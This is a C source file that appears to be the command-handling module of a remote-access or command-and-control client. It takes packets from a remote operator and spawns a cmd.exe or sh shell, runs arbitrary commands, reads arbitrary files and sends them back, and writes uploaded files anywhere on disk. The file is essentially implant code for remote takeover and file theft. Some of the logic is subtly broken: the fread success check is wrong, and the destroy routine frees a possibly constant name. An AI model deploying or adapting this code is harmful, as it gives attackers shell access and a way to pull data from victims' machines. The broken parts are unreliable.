#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>

#ifndef WIN32
#include <unistd.h>
#endif

#include "command_packet.h"
#include "command_packet_stream.h"
#include "driver_exec.h"
#include "log.h"
#include "memory.h"
#include "message.h"
#include "select_group.h"
#include "session.h"
#include "types.h"

#include "driver_command.h"

static void handle_data_in(driver_command_t *driver, uint8_t *data, size_t length)
{
  command_packet_stream_feed(driver->stream, data, length);

  while(command_packet_stream_ready(driver->stream))
  {
    command_packet_t *in = command_packet_stream_read(driver->stream);
    command_packet_t *out = NULL;

    printf("Got a command: ");
    command_packet_print(in);

    if(in->command_id == COMMAND_PING && in->is_request == TRUE)
    {
      printf("Got a ping request! Responding!\n");
      out = command_packet_create_ping_response(in->request_id, in->r.request.body.ping.data);
    }
    else if(in->command_id == COMMAND_SHELL && in->is_request == TRUE)
    {
#ifdef WIN32
      driver_exec_t *driver_exec = driver_exec_create(driver->group, "cmd.exe", in->r.request.body.shell.name);
#else
      /* TODO: Get the 'default' shell? */
      driver_exec_t *driver_exec = driver_exec_create(driver->group, "sh", in->r.request.body.shell.name);
#endif

      out = command_packet_create_shell_response(in->request_id, driver_exec->session_id);
    }
    else if(in->command_id == COMMAND_EXEC && in->is_request == TRUE)
    {
      driver_exec_t *driver_exec = driver_exec_create(driver->group, in->r.request.body.exec.command, in->r.request.body.exec.name);

      out = command_packet_create_exec_response(in->request_id, driver_exec->session_id);
    }
    else if(in->command_id == COMMAND_DOWNLOAD && in->is_request == TRUE)
    {
      struct stat s;
      if(stat(in->r.request.body.download.filename, &s) != 0)
      {
        out = command_packet_create_error_response(in->request_id, -1, "Error opening file for reading");
      }
      else
      {
        uint8_t *data;
        FILE *f = fopen(in->r.request.body.download.filename, "rb");
        if(!f)
        {
          out = command_packet_create_error_response(in->request_id, -1, "Error opening file for reading");
        }
        else
        {
          data = safe_malloc(s.st_size);

          /* TODO: Handling the error kinda poorly here */
          if(fread(data, s.st_size, 1, f) == s.st_size)
            out = command_packet_create_download_response(in->request_id, data, s.st_size);
          else
            out = NULL;

          fclose(f);
          safe_free(data);
        }
      }
    }
    else if(in->command_id == COMMAND_UPLOAD && in->is_request == TRUE)
    {
      FILE *f = fopen(in->r.request.body.upload.filename, "wb");
      if(!f)
      {
        out = command_packet_create_error_response(in->request_id, -1, "Error opening file for writing");
      }
      else
      {
        fwrite(in->r.request.body.upload.data, in->r.request.body.upload.length, 1, f);
        fclose(f);

        out = command_packet_create_upload_response(in->request_id);
      }
    }
    else
    {
      printf("Got a command packet that we don't know how to handle!\n");

      out = command_packet_create_error_response(in->request_id, 0xFFFF, "Not implemented yet!");
    }

    if(out)
    {
      uint8_t *data;
      uint32_t length;

      printf("Response: ");
      command_packet_print(out);

      data = command_packet_to_bytes(out, &length);

      message_post_data_out(driver->session_id, data, length);
    }
  }
}

static void handle_message(message_t *message, void *d)
{
  driver_command_t *driver = (driver_command_t*) d;

  switch(message->type)
  {
    case MESSAGE_DATA_IN:
      if(message->message.data_in.session_id == driver->session_id)
        handle_data_in(driver, message->message.data_in.data, message->message.data_in.length);
      break;

    default:
      LOG_FATAL("driver_command received an invalid message: %d", message->type);
      abort();
  }
}

driver_command_t *driver_command_create(select_group_t *group, char *name)
{
  driver_command_t *driver = (driver_command_t*) safe_malloc(sizeof(driver_command_t));

  message_options_t options[3];

  /* TODO: Find a way to name this using uname or the hostname or something. */
  driver->name = name ? name : "command session";

  driver->stream = command_packet_stream_create(TRUE);
  driver->group = group;

  /* Subscribe to the messages we care about. */
  message_subscribe(MESSAGE_DATA_IN,         handle_message, driver);

  options[0].name    = "name";
  options[0].value.s = driver->name;

  options[1].name    = "is_command";
  options[1].value.i = TRUE;

  options[2].name    = NULL;

  driver->session_id = message_post_create_session(options);

  return driver;
}

void driver_command_destroy(driver_command_t *driver)
{
  if(driver->name)
    safe_free(driver->name);
  if(driver->stream)
    command_packet_stream_destroy(driver->stream);
  safe_free(driver);
}
